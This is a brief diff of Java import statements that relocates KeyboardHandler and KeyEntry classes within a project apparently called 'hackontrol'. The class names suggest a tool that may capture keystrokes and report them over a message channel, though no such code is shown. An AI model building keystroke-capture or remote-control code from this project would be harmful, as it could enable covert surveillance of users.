@@ -7,8 +7,8 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
 import com.khopan.hackontrol.Hackontrol;
-import com.khopan.hackontrol.handler.KeyboardHandler;
-import com.khopan.hackontrol.handler.KeyboardHandler.KeyEntry;
+import com.khopan.hackontrol.KeyboardHandler;
+import com.khopan.hackontrol.KeyboardHandler.KeyEntry;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;
 
